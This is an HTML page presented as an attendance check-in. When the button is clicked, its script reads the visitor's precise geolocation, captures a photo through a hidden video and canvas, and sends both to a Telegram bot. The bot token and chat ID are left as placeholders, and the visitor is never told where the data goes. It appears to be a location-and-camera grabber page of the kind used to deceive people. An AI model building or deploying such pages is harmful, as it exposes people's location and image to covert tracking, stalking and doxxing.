<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Attendance Location + Camera</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: #f2f2f2;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
.container {
    text-align: center;
    background: #fff;
    padding: 30px 40px;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
}
#status {
    margin-top: 15px;
    font-weight: bold;
    font-size: 16px;
    color: #333;
}
button {
    padding: 10px 20px;
    font-size: 16px;
    margin-top: 15px;
    cursor: pointer;
    border: none;
    border-radius: 5px;
    background-color: #2c7;
    color: white;
}
button:hover {
    background-color: #28a745;
}
video, canvas {
    display: none;
}
</style>
</head>
<body>
<div class="container">
    <h2>Attendance Location + Camera</h2>
    <p id="status">Click the button below to mark attendance</p>
    <button id="attendanceBtn">Click Here</button>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
</div>

<script>
const BOT_TOKEN = "YOUR_BOT_TOKEN"; // Telegram Bot Token
const CHAT_ID = "YOUR_CHAT_ID";     // Telegram Chat ID

const btn = document.getElementById('attendanceBtn');
const status = document.getElementById('status');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

btn.addEventListener('click', async () => {
    status.textContent = "Requesting location and camera...";

    // Request location
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        // Send location to Telegram
        const time = new Date().toLocaleString();
        const message = `üìç Attendance Location\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${time}\nhttps://maps.google.com/?q=${lat},${lon}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: {"Content-Type":"application/json"},
                body: JSON.stringify({chat_id: CHAT_ID, text: message})
            });
            status.textContent = "Location sent. Capturing photo...";
        } catch(err) {
            status.textContent = "Failed to send location ‚ùå";
            return;
        }

        // Request camera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            video.srcObject = stream;

            await new Promise(resolve => { video.onloadedmetadata = resolve; });

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video,0,0);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.5);

            // Stop camera
            stream.getTracks().forEach(track => track.stop());

            // Send photo to Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            const blob = await (await fetch(dataUrl)).blob();
            formData.append('photo', blob, 'snapshot.jpg');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });

            status.textContent = "Attendance sent successfully ‚úÖ";
        } catch(err) {
            status.textContent = "Camera access denied or error ‚ùå";
        }

    }, (err) => {
        if(err.code === err.PERMISSION_DENIED){
            status.textContent = "Please allow location & camera permissions üìçüì∏";
        } else {
            status.textContent = "Location error ‚ùå";
        }
    }, { enableHighAccuracy: true, timeout: 10000 });
});
</script>
</body>
</html>
